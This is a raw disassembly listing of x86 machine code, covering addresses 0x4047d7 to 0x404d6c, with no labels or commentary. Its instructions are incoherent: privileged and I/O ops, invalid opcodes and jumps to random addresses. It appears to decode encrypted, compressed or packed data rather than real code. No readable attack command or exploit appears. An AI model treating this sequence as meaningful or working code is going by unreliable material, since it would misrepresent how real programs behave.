  4047d7:	ad                   	lods   %ds:(%esi),%eax
  4047d8:	85 25 72 45 3e 16    	test   %esp,0x163e4572
  4047de:	5e                   	pop    %esi
  4047df:	c8 0a 4a 9a          	enter  $0x4a0a,$0x9a
  4047e3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4047e4:	9d                   	popf
  4047e5:	34 fa                	xor    $0xfa,%al
  4047e7:	40                   	inc    %eax
  4047e8:	0f 15 49 4f          	unpckhps 0x4f(%ecx),%xmm1
  4047ec:	10 46 73             	adc    %al,0x73(%esi)
  4047ef:	4b                   	dec    %ebx
  4047f0:	ef                   	out    %eax,(%dx)
  4047f1:	71 a0                	jno    0x404793
  4047f3:	f7 bc 1d 7d 61 ea 73 	idivl  0x73ea617d(%ebp,%ebx,1)
  4047fa:	42                   	inc    %edx
  4047fb:	43                   	inc    %ebx
  4047fc:	ae                   	scas   %es:(%edi),%al
  4047fd:	da 58 63             	ficompl 0x63(%eax)
  404800:	69 b0 44 7b fe 85 b2 	imul   $0x3888acb2,-0x7a0184bc(%eax),%esi
  404807:	ac 88 38 
  40480a:	2a 16                	sub    (%esi),%dl
  40480c:	65 5c                	gs pop %esp
  40480e:	ce                   	into
  40480f:	14 94                	adc    $0x94,%al
  404811:	03 92 05 52 c3 1f    	add    0x1fc35205(%edx),%edx
  404817:	ce                   	into
  404818:	b8 75 4a 78 a8       	mov    $0xa8784a75,%eax
  40481d:	c1 08 0b             	rorl   $0xb,(%eax)
  404820:	34 16                	xor    $0x16,%al
  404822:	42                   	inc    %edx
  404823:	ba a5 52 a4 71       	mov    $0x71a452a5,%edx
  404828:	08 74 79 cc          	or     %dh,-0x34(%ecx,%edi,2)
  40482c:	41                   	inc    %ecx
  40482d:	34 0e                	xor    $0xe,%al
  40482f:	15 c8 45 41 54       	adc    $0x544145c8,%eax
  404834:	ed                   	in     (%dx),%eax
  404835:	09 c3                	or     %eax,%ebx
  404837:	60                   	pusha
  404838:	fc                   	cld
  404839:	8d                   	lea    (bad),%edi
  40483a:	f8                   	clc
  40483b:	91                   	xchg   %eax,%ecx
  40483c:	c1 35 1c 81 a3 58 e1 	shll   $0xe1,0x58a3811c
  404843:	90                   	nop
  404844:	32 85 6b ca 79 c5    	xor    -0x3a863595(%ebp),%al
  40484a:	36 4c                	ss dec %esp
  40484c:	5b                   	pop    %ebx
  40484d:	a2 b1 60 56 d4       	mov    %al,0xd45660b1
  404852:	b2 52                	mov    $0x52,%dl
  404854:	6f                   	outsl  %ds:(%esi),(%dx)
  404855:	f8                   	clc
  404856:	d6                   	salc
  404857:	2b 94 cf 75 b9 f9 cd 	sub    -0x3206468b(%edi,%ecx,8),%edx
  40485e:	38 b7 b2 28 f6 e6    	cmp    %dh,-0x1909d74e(%edi)
  404864:	b1 5a                	mov    $0x5a,%cl
  404866:	95                   	xchg   %eax,%ebp
  404867:	1e                   	push   %ds
  404868:	18 49 6e             	sbb    %cl,0x6e(%ecx)
  40486b:	2a 94 3c 70 68 80 55 	sub    0x55806870(%esp,%edi,1),%dl
  404872:	f3 6a f9             	repz push $0xfffffff9
  404875:	cd 6f                	int    $0x6f
  404877:	9b                   	fwait
  404878:	02 dc                	add    %ah,%bl
  40487a:	eb dc                	jmp    0x404858
  40487c:	df 4c d8 9e          	fisttps -0x62(%eax,%ebx,8)
  404880:	6d                   	insl   (%dx),%es:(%edi)
  404881:	6b 60 a7 11          	imul   $0x11,-0x59(%eax),%esp
  404885:	8d 25 09 f9 75 90    	lea    0x9075f909,%esp
  40488b:	b1 81                	mov    $0x81,%cl
  40488d:	30 93 61 61 f8 7e    	xor    %dl,0x7ef86161(%ebx)
  404893:	96                   	xchg   %eax,%esi
  404894:	99                   	cltd
  404895:	2f                   	das
  404896:	b2 cd                	mov    $0xcd,%dl
  404898:	a1 3c 66 ad 32       	mov    0x32ad663c,%eax
  40489d:	dc 83 ac 02 31 89    	faddl  -0x76cefd54(%ebx)
  4048a3:	fa                   	cli
  4048a4:	30 7d af             	xor    %bh,-0x51(%ebp)
  4048a7:	44                   	inc    %esp
  4048a8:	33 0a                	xor    (%edx),%ecx
  4048aa:	26 68 ad 60 29 dd    	es push $0xdd2960ad
  4048b0:	8d 7d ae             	lea    -0x52(%ebp),%edi
  4048b3:	ac                   	lods   %ds:(%esi),%al
  4048b4:	03 fe                	add    %esi,%edi
  4048b6:	45                   	inc    %ebp
  4048b7:	f8                   	clc
  4048b8:	1b 04 a1             	sbb    (%ecx,%eiz,4),%eax
  4048bb:	42                   	inc    %edx
  4048bc:	eb 7f                	jmp    0x40493d
  4048be:	82 d3 a6             	adc    $0xa6,%bl
  4048c1:	df 37                	fbstp  (%edi)
  4048c3:	46                   	inc    %esi
  4048c4:	35 ef c0 9d 23       	xor    $0x239dc0ef,%eax
  4048c9:	94                   	xchg   %eax,%esp
  4048ca:	3a 8e a2 ec b4 60    	cmp    0x60b4eca2(%esi),%cl
  4048d0:	85 22                	test   %esp,(%edx)
  4048d2:	41                   	inc    %ecx
  4048d3:	c5 b2 57 69 09 c1    	lds    -0x3ef696a9(%edx),%esi
  4048d9:	75 21                	jne    0x4048fc
  4048db:	eb 4f                	jmp    0x40492c
  4048dd:	03 50 d9             	add    -0x27(%eax),%edx
  4048e0:	1b 59 42             	sbb    0x42(%ecx),%ebx
  4048e3:	57                   	push   %edi
  4048e4:	7b a5                	jnp    0x40488b
  4048e6:	6a 84                	push   $0xffffff84
  4048e8:	5d                   	pop    %ebp
  4048e9:	3d c1 57 7b 1d       	cmp    $0x1d7b57c1,%eax
  4048ee:	45                   	inc    %ebp
  4048ef:	40                   	inc    %eax
  4048f0:	86 e4                	xchg   %ah,%ah
  4048f2:	cc                   	int3
  4048f3:	52                   	push   %edx
  4048f4:	3e 47                	ds inc %edi
  4048f6:	39 bc ce d3 a3 82 7f 	cmp    %edi,0x7f82a3d3(%esi,%ecx,8)
  4048fd:	a3 3d 11 bb 01       	mov    %eax,0x1bb113d
  404902:	88 a8 4e 17 78 54    	mov    %ch,0x5478174e(%eax)
  404908:	3e bc f5 c9 b9 6f    	ds mov $0x6fb9c9f5,%esp
  40490e:	64 9e                	fs sahf
  404910:	9e                   	sahf
  404911:	4e                   	dec    %esi
  404912:	d4 0e                	aam    $0xe
  404914:	cb                   	lret
  404915:	7f 22                	jg     0x404939
  404917:	50                   	push   %eax
  404918:	f4                   	hlt
  404919:	95                   	xchg   %eax,%ebp
  40491a:	fc                   	cld
  40491b:	04 64                	add    $0x64,%al
  40491d:	ef                   	out    %eax,(%dx)
  40491e:	02 32                	add    (%edx),%dh
  404920:	1f                   	pop    %ds
  404921:	87 dd                	xchg   %ebx,%ebp
  404923:	c6                   	(bad)
  404924:	de 6b 33             	fisubrs 0x33(%ebx)
  404927:	e7 50                	out    %eax,$0x50
  404929:	5d                   	pop    %ebp
  40492a:	2b 6f 6b             	sub    0x6b(%edi),%ebp
  40492d:	ba 12 7e b7 3a       	mov    $0x3ab77e12,%edx
  404932:	88 90 51 7e f1 ee    	mov    %dl,-0x110e81af(%eax)
  404938:	8d a3 4d c5 89 c4    	lea    -0x3b763ab3(%ebx),%esp
  40493e:	d8 bc 0f 36 dd bc 47 	fdivrs 0x47bcdd36(%edi,%ecx,1)
  404945:	2a ba c5 fd 85 88    	sub    -0x777a023b(%edx),%bh
  40494b:	31 28                	xor    %ebp,(%eax)
  40494d:	68 e0 ce b7 5e       	push   $0x5eb7cee0
  404952:	b6 4c                	mov    $0x4c,%dh
  404954:	e4 a1                	in     $0xa1,%al
  404956:	cc                   	int3
  404957:	82 2d c1 69 7a 55 4d 	subb   $0x4d,0x557a69c1
  40495e:	9e                   	sahf
  40495f:	2b 24 95 c0 65 cf 8f 	sub    -0x70309a40(,%edx,4),%esp
  404966:	14 db                	adc    $0xdb,%al
  404968:	96                   	xchg   %eax,%esi
  404969:	94                   	xchg   %eax,%esp
  40496a:	e9 8c ba a7 9a       	jmp    0x9ae803fb
  40496f:	f6 8a 42 59 8e e6 dc 	testb  $0xdc,-0x1971a6be(%edx)
  404976:	cd 14                	int    $0x14
  404978:	af                   	scas   %es:(%edi),%eax
  404979:	31 f7                	xor    %esi,%edi
  40497b:	fc                   	cld
  40497c:	ab                   	stos   %eax,%es:(%edi)
  40497d:	ff 9f eb 27 7e b2    	lcall  *-0x4d81d815(%edi)
  404983:	45                   	inc    %ebp
  404984:	92                   	xchg   %eax,%edx
  404985:	fd                   	std
  404986:	2f                   	das
  404987:	23 bf 54 ba 17 20    	and    0x2017ba54(%edi),%edi
  40498d:	a8 68                	test   $0x68,%al
  40498f:	f5                   	cmc
  404990:	2f                   	das
  404991:	79 60                	jns    0x4049f3
  404993:	8f                   	(bad)
  404994:	ec                   	in     (%dx),%al
  404995:	cf                   	iret
  404996:	b0 c8                	mov    $0xc8,%al
  404998:	66 bc 50 45          	mov    $0x4550,%sp
  40499c:	fd                   	std
  40499d:	50                   	push   %eax
  40499e:	72 6f                	jb     0x404a0f
  4049a0:	1d 64 5f 47 0a       	sbb    $0xa475f64,%eax
  4049a5:	92                   	xchg   %eax,%edx
  4049a6:	e9 09 a0 9c 9e       	jmp    0x9edce9b4
  4049ab:	31 24 42             	xor    %esp,(%edx,%eax,2)
  4049ae:	0f 55 9b ba ed 33 00 	andnps 0x33edba(%ebx),%xmm3
  4049b5:	12 e3                	adc    %bl,%ah
  4049b7:	41                   	inc    %ecx
  4049b8:	cd 48                	int    $0x48
  4049ba:	bd 1a 29 4f 97       	mov    $0x974f291a,%ebp
  4049bf:	0b 1a                	or     (%edx),%ebx
  4049c1:	86 54 ca 2d          	xchg   %dl,0x2d(%edx,%ecx,8)
  4049c5:	60                   	pusha
  4049c6:	8a 58 61             	mov    0x61(%eax),%bl
  4049c9:	85 8a aa 3e dc 32    	test   %ecx,0x32dc3eaa(%edx)
  4049cf:	3c 68                	cmp    $0x68,%al
  4049d1:	60                   	pusha
  4049d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4049d3:	de 44 a2 4b          	fiadds 0x4b(%edx,%eiz,4)
  4049d7:	b8 1a 08 59 e2       	mov    $0xe259081a,%eax
  4049dc:	2e dd d4             	cs fst %st(4)
  4049df:	52                   	push   %edx
  4049e0:	c9                   	leave
  4049e1:	84 09                	test   %cl,(%ecx)
  4049e3:	89 32                	mov    %esi,(%edx)
  4049e5:	b5 84                	mov    $0x84,%ch
  4049e7:	f3 90                	pause
  4049e9:	69 9f 35 1d a8 77 ad 	imul   $0x90831cad,0x77a81d35(%edi),%ebx
  4049f0:	1c 83 90 
  4049f3:	ff e0                	jmp    *%eax
  4049f5:	c5 61 6d             	lds    0x6d(%ecx),%esp
  4049f8:	e6 58                	out    %al,$0x58
  4049fa:	4f                   	dec    %edi
  4049fb:	58                   	pop    %eax
  4049fc:	42                   	inc    %edx
  4049fd:	71 50                	jno    0x404a4f
  4049ff:	32 20                	xor    (%eax),%ah
  404a01:	ae                   	scas   %es:(%edi),%al
  404a02:	0f 0c                	(bad)
  404a04:	57                   	push   %edi
  404a05:	83 6d 88 7a          	subl   $0x7a,-0x78(%ebp)
  404a09:	ad                   	lods   %ds:(%esi),%eax
  404a0a:	43                   	inc    %ebx
  404a0b:	67 54                	addr16 push %esp
  404a0d:	04 ee                	add    $0xee,%al
  404a0f:	7b 83                	jnp    0x404994
  404a11:	f3 3e 1c 5d          	repz ds sbb $0x5d,%al
  404a15:	ce                   	into
  404a16:	2e f9                	cs stc
  404a18:	33 30                	xor    (%eax),%esi
  404a1a:	12 33                	adc    (%ebx),%dh
  404a1c:	4a                   	dec    %edx
  404a1d:	14 9f                	adc    $0x9f,%al
  404a1f:	b0 31                	mov    $0x31,%al
  404a21:	05 e8 f2 11 fd       	add    $0xfd11f2e8,%eax
  404a26:	25 cd f5 c2 3b       	and    $0x3bc2f5cd,%eax
  404a2b:	4b                   	dec    %ebx
  404a2c:	63 29                	arpl   %ebp,(%ecx)
  404a2e:	cd 14                	int    $0x14
  404a30:	32 a9 30 2f f9 ed    	xor    -0x1206d0d0(%ecx),%ch
  404a36:	18 ac ee 8d 53 81 02 	sbb    %ch,0x281538d(%esi,%ebp,8)
  404a3d:	9b                   	fwait
  404a3e:	70 64                	jo     0x404aa4
  404a40:	39 d6                	cmp    %edx,%esi
  404a42:	ce                   	into
  404a43:	58                   	pop    %eax
  404a44:	7e 83                	jle    0x4049c9
  404a46:	39 c6                	cmp    %eax,%esi
  404a48:	93                   	xchg   %eax,%ebx
  404a49:	d3 a6 af 7c 23 89    	shll   %cl,-0x76dc8351(%esi)
  404a4f:	3a 05 a9 cc 03 56    	cmp    0x5603cca9,%al
  404a55:	97                   	xchg   %eax,%edi
  404a56:	fe                   	(bad)
  404a57:	31 ad 39 f5 56 9a    	xor    %ebp,-0x65a90ac7(%ebp)
  404a5d:	c3                   	ret
  404a5e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404a5f:	f8                   	clc
  404a60:	47                   	inc    %edi
  404a61:	3b b0 34 3b 2a c1    	cmp    -0x3ed5c4cc(%eax),%esi
  404a67:	43                   	inc    %ebx
  404a68:	01 6b fa             	add    %ebp,-0x6(%ebx)
  404a6b:	d2 5c a9 d7          	rcrb   %cl,-0x29(%ecx,%ebp,4)
  404a6f:	e7 f4                	out    %eax,$0xf4
  404a71:	b0 d3                	mov    $0xd3,%al
  404a73:	62 eb e9             	(bad) {%k3}
  404a76:	2b f8                	sub    %eax,%edi
  404a78:	02 db                	add    %bl,%bl
  404a7a:	0c c4                	or     $0xc4,%al
  404a7c:	01 c3                	add    %eax,%ebx
  404a7e:	2b a6 0d ed 81 b6    	sub    -0x497e12f3(%esi),%esp
  404a84:	ac                   	lods   %ds:(%esi),%al
  404a85:	10 28                	adc    %ch,(%eax)
  404a87:	01 94 03 99 12 6a 43 	add    %edx,0x436a1299(%ebx,%eax,1)
  404a8e:	49                   	dec    %ecx
  404a8f:	69 11 f1 12 ab a4    	imul   $0xa4ab12f1,(%ecx),%edx
  404a95:	7b e3                	jnp    0x404a7a
  404a97:	4f                   	dec    %edi
  404a98:	86 08                	xchg   %cl,(%eax)
  404a9a:	47                   	inc    %edi
  404a9b:	3f                   	aas
  404a9c:	d2 d3                	rcl    %cl,%bl
  404a9e:	83 ce 9f             	or     $0xffffff9f,%esi
  404aa1:	9c                   	pushf
  404aa2:	62 61 50             	bound  %esp,0x50(%ecx)
  404aa5:	43                   	inc    %ebx
  404aa6:	73 a1                	jae    0x404a49
  404aa8:	4c                   	dec    %esp
  404aa9:	e4 4d                	in     $0x4d,%al
  404aab:	c1 2f f1             	shrl   $0xf1,(%edi)
  404aae:	0c b8                	or     $0xb8,%al
  404ab0:	3f                   	aas
  404ab1:	53                   	push   %ebx
  404ab2:	ef                   	out    %eax,(%dx)
  404ab3:	98                   	cwtl
  404ab4:	c9                   	leave
  404ab5:	ea 18 ca 0d 0f d9 0e 	ljmp   $0xed9,$0xf0dca18
  404abc:	3a e0                	cmp    %al,%ah
  404abe:	0f aa                	rsm
  404ac0:	86 4f 1d             	xchg   %cl,0x1d(%edi)
  404ac3:	68 44 79 84 5f       	push   $0x5f847944
  404ac8:	95                   	xchg   %eax,%ebp
  404ac9:	93                   	xchg   %eax,%ebx
  404aca:	ac                   	lods   %ds:(%esi),%al
  404acb:	af                   	scas   %es:(%edi),%eax
  404acc:	7c 69                	jl     0x404b37
  404ace:	7f ae                	jg     0x404a7e
  404ad0:	2a 19                	sub    (%ecx),%bl
  404ad2:	ca ee c6             	lret   $0xc6ee
  404ad5:	88 9e 8d 9b 2a 60    	mov    %bl,0x602a9b8d(%esi)
  404adb:	6c                   	insb   (%dx),%es:(%edi)
  404adc:	e3 a3                	jecxz  0x404a81
  404ade:	b1 0e                	mov    $0xe,%cl
  404ae0:	b8 c4 1f 9d 12       	mov    $0x129d1fc4,%eax
  404ae5:	7f 2e                	jg     0x404b15
  404ae7:	df 61 24             	fbld   0x24(%ecx)
  404aea:	05 ff 48 1f e5       	add    $0xe51f48ff,%eax
  404aef:	fd                   	std
  404af0:	78 90                	js     0x404a82
  404af2:	60                   	pusha
  404af3:	48                   	dec    %eax
  404af4:	3b 37                	cmp    (%edi),%esi
  404af6:	ff 01                	incl   (%ecx)
  404af8:	06                   	push   %es
  404af9:	27                   	daa
  404afa:	fa                   	cli
  404afb:	33 d4                	xor    %esp,%edx
  404afd:	2d ed f6 90 57       	sub    $0x5790f6ed,%eax
  404b02:	64 b7 cb             	fs mov $0xcb,%bh
  404b05:	35 65 fc 96 c3       	xor    $0xc396fc65,%eax
  404b0a:	9f                   	lahf
  404b0b:	12 6a 93             	adc    -0x6d(%edx),%ch
  404b0e:	41                   	inc    %ecx
  404b0f:	fd                   	std
  404b10:	43                   	inc    %ebx
  404b11:	41                   	inc    %ecx
  404b12:	81 2b ce bb 36 fa    	subl   $0xfa36bbce,(%ebx)
  404b18:	b4 52                	mov    $0x52,%ah
  404b1a:	1d bb f9 da 67       	sbb    $0x67daf9bb,%eax
  404b1f:	22 89 ff df fa aa    	and    -0x55052001(%ecx),%cl
  404b25:	e2 67                	loop   0x404b8e
  404b27:	7c 42                	jl     0x404b6b
  404b29:	14 38                	adc    $0x38,%al
  404b2b:	c3                   	ret
  404b2c:	9e                   	sahf
  404b2d:	56                   	push   %esi
  404b2e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404b2f:	2c fb                	sub    $0xfb,%al
  404b31:	e0 08                	loopne 0x404b3b
  404b33:	83 45 50 9a          	addl   $0xffffff9a,0x50(%ebp)
  404b37:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404b38:	ff                   	lcall  (bad)
  404b39:	df 4e 2b             	fisttps 0x2b(%esi)
  404b3c:	cd c7                	int    $0xc7
  404b3e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404b3f:	a3 61 1e 27 cb       	mov    %eax,0xcb271e61
  404b44:	1c a2                	sbb    $0xa2,%al
  404b46:	df 32                	fbstp  (%edx)
  404b48:	a2 cb c0 68 95       	mov    %al,0x9568c0cb
  404b4d:	c5 c4 08             	(bad)
  404b50:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404b51:	96                   	xchg   %eax,%esi
  404b52:	c3                   	ret
  404b53:	78 e8                	js     0x404b3d
  404b55:	c3                   	ret
  404b56:	90                   	nop
  404b57:	75 a0                	jne    0x404af9
  404b59:	91                   	xchg   %eax,%ecx
  404b5a:	82 d8 4f             	sbb    $0x4f,%al
  404b5d:	44                   	inc    %esp
  404b5e:	07                   	pop    %es
  404b5f:	dd c3                	ffree  %st(3)
  404b61:	1f                   	pop    %ds
  404b62:	84 c0                	test   %al,%al
  404b64:	3c f5                	cmp    $0xf5,%al
  404b66:	24 b6                	and    $0xb6,%al
  404b68:	4a                   	dec    %edx
  404b69:	30 f8                	xor    %bh,%al
  404b6b:	20 0a                	and    %cl,(%edx)
  404b6d:	94                   	xchg   %eax,%esp
  404b6e:	b5 49                	mov    $0x49,%ch
  404b70:	2c 19                	sub    $0x19,%al
  404b72:	3c 3f                	cmp    $0x3f,%al
  404b74:	a1 7a 2e f3 18       	mov    0x18f32e7a,%eax
  404b79:	08 0e                	or     %cl,(%esi)
  404b7b:	78 e1                	js     0x404b5e
  404b7d:	80 53 e1 7a          	adcb   $0x7a,-0x1f(%ebx)
  404b81:	40                   	inc    %eax
  404b82:	f3 07                	repz pop %es
  404b84:	15 2f 38 b3 d9       	adc    $0xd9b3382f,%eax
  404b89:	a9 5b 4b ce cc       	test   $0xccce4b5b,%eax
  404b8e:	9b                   	fwait
  404b8f:	27                   	daa
  404b90:	85 4e 89             	test   %ecx,-0x77(%esi)
  404b93:	49                   	dec    %ecx
  404b94:	fe c6                	inc    %dh
  404b96:	4b                   	dec    %ebx
  404b97:	b3 aa                	mov    $0xaa,%bl
  404b99:	89 3b                	mov    %edi,(%ebx)
  404b9b:	16                   	push   %ss
  404b9c:	82 6c c2 1a d1       	subb   $0xd1,0x1a(%edx,%eax,8)
  404ba1:	47                   	inc    %edi
  404ba2:	3f                   	aas
  404ba3:	ef                   	out    %eax,(%dx)
  404ba4:	56                   	push   %esi
  404ba5:	0b 71 ec             	or     -0x14(%ecx),%esi
  404ba8:	6a 05                	push   $0x5
  404baa:	b9 7e 96 70 91       	mov    $0x9170967e,%ecx
  404baf:	ff 65 8a             	jmp    *-0x76(%ebp)
  404bb2:	95                   	xchg   %eax,%ebp
  404bb3:	58                   	pop    %eax
  404bb4:	cc                   	int3
  404bb5:	c3                   	ret
  404bb6:	cc                   	int3
  404bb7:	23 34 2e             	and    (%esi,%ebp,1),%esi
  404bba:	97                   	xchg   %eax,%edi
  404bbb:	f0 f2 a8 0e          	lock repnz test $0xe,%al
  404bbf:	1f                   	pop    %ds
  404bc0:	cf                   	iret
  404bc1:	68 ae 45 ba 57       	push   $0x57ba45ae
  404bc6:	f3 f0 39 2e          	repz lock cmp %ebp,(%esi)
  404bca:	e9 76 4a f4 56       	jmp    0x57349645
  404bcf:	65 9b                	gs fwait
  404bd1:	76 44                	jbe    0x404c17
  404bd3:	87 0c ef             	xchg   %ecx,(%edi,%ebp,8)
  404bd6:	06                   	push   %es
  404bd7:	f1                   	int1
  404bd8:	ac                   	lods   %ds:(%esi),%al
  404bd9:	b1 f6                	mov    $0xf6,%cl
  404bdb:	53                   	push   %ebx
  404bdc:	a8 94                	test   $0x94,%al
  404bde:	7d 58                	jge    0x404c38
  404be0:	d2 c7                	rol    %cl,%bh
  404be2:	fa                   	cli
  404be3:	2c 6f                	sub    $0x6f,%al
  404be5:	22 28                	and    (%eax),%ch
  404be7:	30 b1 25 54 18 19    	xor    %dh,0x19185425(%ecx)
  404bed:	6b 39 18             	imul   $0x18,(%ecx),%edi
  404bf0:	55                   	push   %ebp
  404bf1:	b4 70                	mov    $0x70,%ah
  404bf3:	58                   	pop    %eax
  404bf4:	29 16                	sub    %edx,(%esi)
  404bf6:	de 44 6b 7d          	fiadds 0x7d(%ebx,%ebp,2)
  404bfa:	e7 27                	out    %eax,$0x27
  404bfc:	08 c6                	or     %al,%dh
  404bfe:	d8 58 b0             	fcomps -0x50(%eax)
  404c01:	01 78 87             	add    %edi,-0x79(%eax)
  404c04:	cd 25                	int    $0x25
  404c06:	b1 31                	mov    $0x31,%cl
  404c08:	0d 34 fc b9 43       	or     $0x43b9fc34,%eax
  404c0d:	2e 2f                	cs das
  404c0f:	01 fd                	add    %edi,%ebp
  404c11:	b5 62                	mov    $0x62,%ch
  404c13:	c6                   	(bad)
  404c14:	2c 3f                	sub    $0x3f,%al
  404c16:	da 2e                	fisubrl (%esi)
  404c18:	c5 df b3             	(bad)
  404c1b:	96                   	xchg   %eax,%esi
  404c1c:	c7                   	(bad)
  404c1d:	94                   	xchg   %eax,%esp
  404c1e:	21 96 eb e9 b7 62    	and    %edx,0x62b7e9eb(%esi)
  404c24:	a0 50 e3 6d cc       	mov    0xcc6de350,%al
  404c29:	5c                   	pop    %esp
  404c2a:	0a 76 cd             	or     -0x33(%esi),%dh
  404c2d:	2f                   	das
  404c2e:	b7 05                	mov    $0x5,%bh
  404c30:	34 fc                	xor    $0xfc,%al
  404c32:	d2 6a 0b             	shrb   %cl,0xb(%edx)
  404c35:	bd f8 ba f0 5a       	mov    $0x5af0baf8,%ebp
  404c3a:	5d                   	pop    %ebp
  404c3b:	9a 30 eb b3 04 e3 88 	lcall  $0x88e3,$0x4b3eb30
  404c42:	10 9f c6 2a 71 a4    	adc    %bl,-0x5b8ed53a(%edi)
  404c48:	b9 3d 8f 96 a3       	mov    $0xa3968f3d,%ecx
  404c4d:	a9 15 3d 00 4f       	test   $0x4f003d15,%eax
  404c52:	02 0d 1e 42 8e 31    	add    0x318e421e,%cl
  404c58:	d5 1c                	aad    $0x1c
  404c5a:	34 d8                	xor    $0xd8,%al
  404c5c:	f6 b1 ca c0 00 03    	divb   0x300c0ca(%ecx)
  404c62:	76 80                	jbe    0x404be4
  404c64:	62 e5 8a             	(bad) {rd-bad},{%k5}
  404c67:	35 bf a4 ac 9a       	xor    $0x9aaca4bf,%eax
  404c6c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404c6d:	0a 13                	or     (%ebx),%dl
  404c6f:	7b 71                	jnp    0x404ce2
  404c71:	db 71 57             	(bad) 0x57(%ecx)
  404c74:	35 e1 a4 a0 1a       	xor    $0x1aa0a4e1,%eax
  404c79:	87 09                	xchg   %ecx,(%ecx)
  404c7b:	dd 69 9d             	(bad) -0x63(%ecx)
  404c7e:	fd                   	std
  404c7f:	f6 de                	neg    %dh
  404c81:	ea eb f5 37 46 46 83 	ljmp   $0x8346,$0x4637f5eb
  404c88:	ea 46 b5 2b 43 fb d0 	ljmp   $0xd0fb,$0x432bb546
  404c8f:	7a 0a                	jp     0x404c9b
  404c91:	47                   	inc    %edi
  404c92:	b9 4a 09 6a 49       	mov    $0x496a094a,%ecx
  404c97:	6f                   	outsl  %ds:(%esi),(%dx)
  404c98:	ef                   	out    %eax,(%dx)
  404c99:	44                   	inc    %esp
  404c9a:	ef                   	out    %eax,(%dx)
  404c9b:	04 0d                	add    $0xd,%al
  404c9d:	c2 dc ee             	ret    $0xeedc
  404ca0:	19 29                	sbb    %ebp,(%ecx)
  404ca2:	2b 8a 48 2d 6b 41    	sub    0x416b2d48(%edx),%ecx
  404ca8:	96                   	xchg   %eax,%esi
  404ca9:	87 47 96             	xchg   %eax,-0x6a(%edi)
  404cac:	6c                   	insb   (%dx),%es:(%edi)
  404cad:	59                   	pop    %ecx
  404cae:	95                   	xchg   %eax,%ebp
  404caf:	d9 af 09 34 cb 0b    	fldcw  0xbcb3409(%edi)
  404cb5:	0a 60 de             	or     -0x22(%eax),%ah
  404cb8:	33 4f 3b             	xor    0x3b(%edi),%ecx
  404cbb:	e5 7d                	in     $0x7d,%eax
  404cbd:	c7 b8 34 f7 01       	xbegin 0x237817a,(bad)
  404cc2:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404cc3:	33 50 45             	xor    0x45(%eax),%edx
  404cc6:	10 c3                	adc    %al,%bl
  404cc8:	29 69 50             	sub    %ebp,0x50(%ecx)
  404ccb:	9b                   	fwait
  404ccc:	1e                   	push   %ds
  404ccd:	57                   	push   %edi
  404cce:	b2 e2                	mov    $0xe2,%dl
  404cd0:	03 6f 21             	add    0x21(%edi),%ebp
  404cd3:	1c ce                	sbb    $0xce,%al
  404cd5:	f3 2f                	repz das
  404cd7:	7f 11                	jg     0x404cea
  404cd9:	47                   	inc    %edi
  404cda:	aa                   	stos   %al,%es:(%edi)
  404cdb:	42                   	inc    %edx
  404cdc:	35 da 92 2c 8a       	xor    $0x8a2c92da,%eax
  404ce1:	51                   	push   %ecx
  404ce2:	e6 c7                	out    %al,$0xc7
  404ce4:	67 55                	addr16 push %ebp
  404ce6:	26 6e                	outsb  %es:(%esi),(%dx)
  404ce8:	ad                   	lods   %ds:(%esi),%eax
  404ce9:	d4 22                	aam    $0x22
  404ceb:	d4 85                	aam    $0x85
  404ced:	85 5a 37             	test   %ebx,0x37(%edx)
  404cf0:	7a aa                	jp     0x404c9c
  404cf2:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404cf3:	75 04                	jne    0x404cf9
  404cf5:	66 72 35             	data16 jb 0x404d2d
  404cf8:	5d                   	pop    %ebp
  404cf9:	16                   	push   %ss
  404cfa:	d3 29                	shrl   %cl,(%ecx)
  404cfc:	8b b1 36 75 10 2a    	mov    0x2a107536(%ecx),%esi
  404d02:	62 47 69             	bound  %eax,0x69(%edi)
  404d05:	6d                   	insl   (%dx),%es:(%edi)
  404d06:	cb                   	lret
  404d07:	67 42                	addr16 inc %edx
  404d09:	91                   	xchg   %eax,%ecx
  404d0a:	0b db                	or     %ebx,%ebx
  404d0c:	37                   	aaa
  404d0d:	7f 6d                	jg     0x404d7c
  404d0f:	a0 1c 97 dc 89       	mov    0x89dc971c,%al
  404d14:	18 e4                	sbb    %ah,%ah
  404d16:	14 f7                	adc    $0xf7,%al
  404d18:	2a 6f 65             	sub    0x65(%edi),%ch
  404d1b:	91                   	xchg   %eax,%ecx
  404d1c:	4e                   	dec    %esi
  404d1d:	02 4e 41             	add    0x41(%esi),%cl
  404d20:	dd 7e 81             	fnstsw -0x7f(%esi)
  404d23:	97                   	xchg   %eax,%edi
  404d24:	e5 29                	in     $0x29,%eax
  404d26:	3f                   	aas
  404d27:	f1                   	int1
  404d28:	e6 23                	out    %al,$0x23
  404d2a:	b9 bc 34 cc 3e       	mov    $0x3ecc34bc,%ecx
  404d2f:	b1 91                	mov    $0x91,%cl
  404d31:	a9 7e b3 1d 8a       	test   $0x8a1db37e,%eax
  404d36:	2b 6a 05             	sub    0x5(%edx),%ebp
  404d39:	33 8e 67 a2 7d f2    	xor    -0xd825d99(%esi),%ecx
  404d3f:	b2 29                	mov    $0x29,%dl
  404d41:	50                   	push   %eax
  404d42:	1b 92 da 9f 81 85    	sbb    -0x7a7e6026(%edx),%edx
  404d48:	d6                   	salc
  404d49:	78 3e                	js     0x404d89
  404d4b:	df 0a                	fisttps (%edx)
  404d4d:	87 b5 f8 cf 84 f6    	xchg   %esi,-0x97b3008(%ebp)
  404d53:	ec                   	in     (%dx),%al
  404d54:	ae                   	scas   %es:(%edi),%al
  404d55:	0a d3                	or     %bl,%dl
  404d57:	00 4b b7             	add    %cl,-0x49(%ebx)
  404d5a:	06                   	push   %es
  404d5b:	b1 14                	mov    $0x14,%cl
  404d5d:	71 2c                	jno    0x404d8b
  404d5f:	54                   	push   %esp
  404d60:	f0 86 cd             	lock xchg %cl,%ch
  404d63:	a2 5a 0e df 08       	mov    %al,0x8df0e5a
  404d68:	d4 c1                	aam    $0xc1
  404d6a:	76 81                	jbe    0x404ced
  404d6c:	56                   	push   %esi
